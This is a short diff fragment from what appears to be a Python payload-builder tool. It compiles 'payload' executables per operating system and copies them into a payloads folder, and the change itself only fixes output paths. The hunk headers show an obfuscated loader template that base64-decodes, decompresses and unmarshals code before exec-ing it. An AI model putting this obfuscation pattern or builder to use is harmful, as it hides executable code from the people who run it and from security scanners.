@@ -305,7 +305,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
                     result.stdout.decode(), result.stderr.decode()
                 )  # Print output for debugging
                 shutil.copy(
-                    f"dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe"
+                    f"{payload_file_name}/dist/{payload_file_name}.exe", f"payloads/{payload_file_name}.exe"
                 )
 
             elif os_name == "Linux":
@@ -317,7 +317,7 @@ exec(marshal.loads(zlib.decompress(base64.b64decode({repr(base64.b64encode(zlib.
                 print(
                     result.stdout.decode(), result.stderr.decode()
                 )  # Print output for debugging
-                shutil.copy(f"dist/{payload_file_name}", f"payloads/{payload_file_name}")
+                shutil.copy(f"{payload_file_name}/dist/{payload_file_name}", f"payloads/{payload_file_name}")
 
             elif os_name == "OSX":
                 result = subprocess.run(
